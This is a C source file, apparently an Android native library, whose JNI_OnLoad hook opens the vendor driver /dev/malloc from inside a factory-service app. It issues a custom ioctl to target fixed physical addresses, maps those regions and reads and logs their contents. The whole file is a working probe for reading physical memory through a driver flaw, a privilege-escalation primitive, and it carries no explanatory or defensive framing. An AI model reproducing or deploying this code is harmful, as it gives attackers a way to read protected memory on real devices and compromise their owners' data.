typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long long u64;
#define SYS_open 5
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_write 4
#define SYS_close 6
static long sc(long n,long a,long b,long c,long d,long e,long f){register long r7 __asm__("r7")=n;register long r0 __asm__("r0")=a;register long r1 __asm__("r1")=b;register long r2 __asm__("r2")=c;register long r3 __asm__("r3")=d;register long r4 __asm__("r4")=e;register long r5 __asm__("r5")=f;__asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");return r0;}
static long lg=-1;
static void put(const char*s){int n=0;while(s[n])n++;if(lg>=0)sc(SYS_write,lg,(long)s,n,0,0,0);}
static void hx(unsigned long long v){char b[19];int i;for(i=0;i<16;i++){int d=(v>>((15-i)*4))&15;b[i]=d<10?48+d:87+d;}b[16]=10;b[17]=0;put(b);}
static void dec(long v){char b[24];int i=23;b[23]=0;if(v==0){put("0");return;}int neg=0;if(v<0){neg=1;v=-v;}while(v){b[--i]=48+v%10;v/=10;}if(neg)b[--i]=45;put(b+i);}
struct info { u64 addr; u64 size; u64 interval; u8 miusel; u8 pad[7]; };
#define MPOOL_IOC_SET 0x80204d04u
static void trymap(long fd,unsigned long long off,unsigned long long sz){
 struct info in; in.addr=off;in.size=sz;in.interval=0;in.miusel=0;in.pad[0]=0;
 long r=sc(SYS_ioctl,fd,MPOOL_IOC_SET,(long)&in,0,0,0);
 put("set ");hx(off);put(" rc=");dec(r);put("\n");
 if(r) return;
 long p=sc(SYS_mmap2,0,sz,3,1,fd,0);
 put("mmap ");hx((unsigned long long)p);put("\n");
 if((long)p<0) return;
 unsigned long long w=*(volatile unsigned long long*)(long)p;
 put("word ");hx(w);put("\n");
 sc(SYS_munmap,p,sz,0,0,0,0);
}
__attribute__((visibility("default"))) int JNI_OnLoad(void*a,void*b){
 lg=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/mpool.log",0x241,0644,0,0,0);
 put("start\n");
 long fd=sc(SYS_open,(long)"/dev/malloc",2,0,0,0,0);
 put("fd=");dec(fd);put("\n");
 if(fd<0) return 0x10006;
 trymap(fd,0x20280000ULL,0x1000);
 trymap(fd,0x00280000ULL,0x1000);
 trymap(fd,0x20000000ULL,0x1000);
 trymap(fd,0x00080000ULL,0x1000);
 sc(SYS_close,fd,0,0,0,0,0);
 put("end\n");
 return 0x10006;
}
